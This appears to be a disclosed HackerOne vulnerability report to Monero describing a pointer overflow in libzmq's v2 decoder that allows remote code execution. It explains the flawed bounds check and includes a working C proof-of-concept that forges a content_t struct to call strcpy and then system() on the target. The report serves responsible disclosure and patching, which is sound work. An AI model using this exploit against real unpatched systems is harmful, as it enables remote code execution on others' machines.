@@ -1,0 +1,223 @@
+ReportLink:https://hackerone.com/reports/652911
+WeaknessName:Violation of Secure Design Principles
+Reporter:https://hackerone.com/evertonmelo
+ReportedTo:Monero(monero)
+BountyAmount:
+Severity:medium
+State:Closed
+DateOfDisclosure:18.11.2019 23:01:35
+
+Summary:
+
+## Summary:
+A pointer overflow, with code execution, was discovered in ZeroMQ libzmq (aka 0MQ) 4.2.x and 4.3.x before 4.3.1. A v2_decoder.cpp zmq::v2_decoder_t::size_ready integer overflow allows an authenticated attacker to overwrite an arbitrary amount of bytes beyond the bounds of a buffer, which can be leveraged to run arbitrary code on the target system. The memory layout allows the attacker to inject OS commands into a data structure located immediately after the problematic buffer (i.e., it is not necessary to use a typical buffer-overflow exploitation technique that changes the flow of control).  
+
+## Releases Affected:
+
+Monero <v0.14.1.0 ( all version ). 
+
+## Steps To Reproduce:
+
+In src/v2_decoder.cpp zmq::v2_decoder_t::eight_byte_size_ready(), the attacker can provide an uint64_t of his choosing:
+
+ 85 int zmq::v2_decoder_t::eight_byte_size_ready (unsigned char const *read_from_)
+ 86 {
+ 87     //  The payload size is encoded as 64-bit unsigned integer.
+ 88     //  The most significant byte comes first.
+ 89     const uint64_t msg_size = get_uint64 (_tmpbuf);
+ 90 
+ 91     return size_ready (msg_size, read_from_);
+ 92 }
+
+Then, in src/v2_decoder.cpp zmq::v2_decoder_t::size_ready(), a comparison is performed to check if this peer-supplied msg_size_ is within the bounds of the currently allocated block of memory:
+
+117     if (unlikely (!_zero_copy
+118                   || ((unsigned char *) read_pos_ + msg_size_
+119                       > (allocator.data () + allocator.size ())))) {
+
+This is inadequate because a very large msg_size_ will overflow the pointer (read_pos_).
+In other words, the comparison will compute as 'false' even though msg_size_ bytes don't fit in the currently allocated block.
+Exploit details
+
+Now that msg_size_ has been set to a very high value, the attacker is allowed to send this amount of bytes, and libzmq will copy it to its internal buffer without any further checks.
+
+This means that it's possible to write beyond the bounds of the allocated space.
+
+However, for the exploit this is not necessary to corrupt memory beyond the buffer proper.
+
+As it turns out, the space the attacker is writing to is immediately followed by a struct content_t block:
+
+ 67     struct content_t
+ 68     {
+ 69         void *data;
+ 70         size_t size;
+ 71         msg_free_fn *ffn;
+ 72         void *hint;
+ 73         zmq::atomic_counter_t refcnt;
+ 74     };
+
+So the memory layout is such that the receive buffer is immediately followed by data, then size, then ffn, then hint, then refcnt.
+Note that the receive buffer + the struct content_t is a single, solid block of memory; by overwriting beyond the designated receive buffer's bounds, no dlmalloc state variables in memory (like bk, fd) are corrupted (or, in other words, it wouldn't trigger AddressSanitizer).
+
+This means that the attacker can overwrite all these members with arbitrary values.
+
+ffn is a function pointer, that upon connection closure, is called with two parameters, data and hint.
+
+This means the attacker can call an arbitrary function/address with two arbitrary parameters.
+
+In my exploit, I set ffn to the address of strcpy, set the first parameter to somewhere in the executable's .data section, and the second parameter to the address of the character I want to write followed by a NULL character.
+
+So for instance, if i want to write a 'g' character, I search the binary for an occurrence of 'g\x00', and use this address as the second value to my strcpy call.
+
+For each character of the command I want to execute on the remote machine, I make a separate request to write that character to the .data section.
+So if I want to execute 'gnome-calculator', I first write a 'g', then a 'n', then an 'o', and so on, until the full 'gnome-calculator' string is written to .data.
+
+In the next request, I overwrite the 'data' member of struct content_t with the address of the .data section (where now gnome-calculator resides), set the ffn member to the system libc function, and hint to NULL.
+
+In effect, this calls system("gnome-calculator"), by which this command is executed on the remote machine.
+Exploit
+
+The following is a self-exploit, that demonstrates the exploit flow as explained above.
+
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <zmq.hpp>
+#include <string>
+#include <iostream>
+#include <unistd.h>
+#include <thread>
+#include <mutex>
+
+class Thread {
+    public:
+    Thread() : the_thread(&Thread::ThreadMain, this)
+    { }
+    ~Thread(){
+    }
+    private:
+    std::thread the_thread;
+    void ThreadMain() {
+        zmq::context_t context (1);
+        zmq::socket_t socket (context, ZMQ_REP);
+        socket.bind ("tcp://*:6666");
+
+        while (true) {
+            zmq::message_t request;
+
+            // Wait for next request from client
+            try {
+                socket.recv (&request);
+            } catch ( ... ) { }
+        }
+    }
+};
+
+static void callRemoteFunction(const uint64_t arg1Addr, const uint64_t arg2Addr, const uint64_t funcAddr)
+{
+    int s;
+    struct sockaddr_in remote_addr = {};
+    if ((s = socket(AF_INET, SOCK_STREAM, 0)) == -1)
+    {
+        abort();
+    }
+    remote_addr.sin_family = AF_INET;
+    remote_addr.sin_port = htons(6666);
+    inet_pton(AF_INET, "127.0.0.1", &remote_addr.sin_addr);
+
+    if (connect(s, (struct sockaddr *)&remote_addr, sizeof(struct sockaddr)) == -1)
+    {
+        abort();
+    }
+
+    const uint8_t greeting[] = {
+        0xFF, /* Indicates 'versioned' in zmq::stream_engine_t::receive_greeting */
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* Unused */
+        0x01, /* Indicates 'versioned' in zmq::stream_engine_t::receive_greeting */
+        0x01, /* Selects ZMTP_2_0 in zmq::stream_engine_t::select_handshake_fun */
+        0x00, /* Unused */
+    };
+    send(s, greeting, sizeof(greeting), 0);
+
+    const uint8_t v2msg[] = {
+        0x02, /* v2_decoder_t::eight_byte_size_ready */
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, /* msg_size */
+    };
+    send(s, v2msg, sizeof(v2msg), 0);
+
+    /* Write UNTIL the location of zmq::msg_t::content_t */
+    size_t plsize = 8183;
+    uint8_t* pl = (uint8_t*)calloc(1, plsize);
+    send(s, pl, plsize, 0);
+    free(pl);
+
+    uint8_t content_t_replacement[] = {
+        /* void* data */
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+
+        /* size_t size */
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+
+        /* msg_free_fn *ffn */
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+
+        /* void* hint */
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    };
+
+    /* Assumes same endianness as target */
+    memcpy(content_t_replacement + 0, &arg1Addr, sizeof(arg1Addr));
+    memcpy(content_t_replacement + 16, &funcAddr, sizeof(funcAddr));
+    memcpy(content_t_replacement + 24, &arg2Addr, sizeof(arg2Addr));
+
+    /* Overwrite zmq::msg_t::content_t */
+    send(s, content_t_replacement, sizeof(content_t_replacement), 0);
+
+    close(s);
+    sleep(1);
+}
+
+char destbuffer[100];
+char srcbuffer[100] = "ping google.com";
+
+int main(void)
+{
+    Thread* rt = new Thread();
+    sleep(1);
+
+    callRemoteFunction((uint64_t)destbuffer, (uint64_t)srcbuffer, (uint64_t)strcpy);
+
+    callRemoteFunction((uint64_t)destbuffer, 0, (uint64_t)system);
+
+    return 0;
+}
+
+Notes
+
+Crucial to this exploit is knowing certain addresses, like strcpy and system, though the address of strcpy could be replaced with any executable location that contains stosw / ret or anything else that moves [rsi] to [rdi], and system might be replaced with code that executes the string at rsi.
+
+I did not find any other vulnerabilities in libzmq, but if there is any information leaking vulnerability in libzmq, or the application that uses it, that would allow the attacker to calculate proper code offsets, this would defeat ASLR.
+Resolution
+
+Resolution of this vulnerability must consist of preventing pointer arithmetic overflow in src/v2_decoder.cpp zmq::v2_decoder_t::size_ready().
+## Supporting Material/References:
+[list any additional material (e.g. screenshots, logs, etc.)]
+
+## source code vulnerable: 
+https://github.com/monero-project/monero/blob/master/contrib/depends/packages/zeromq.mk
+
+## fix:
+https://github.com/zeromq/libzmq/releases/tag/v4.3.1 
+
+# poc:
+https://github.com/zeromq/libzmq/issues/3351 
+
+## References:
+
+https://github.com/zeromq/libzmq/issues/3351
+https://github.com/zeromq/libzmq/releases/tag/v4.3.1
+    DEBIAN: https://www.debian.org/security/2019/dsa-4368
+    GENTOO:GLSA-201903-22 https://security.gentoo.org/glsa/201903-22
+
+## Impact
+
+A pointer overflow, with code execution, was discovered in ZeroMQ libzmq (aka 0MQ) 4.2.x and 4.3.x before 4.3.1.
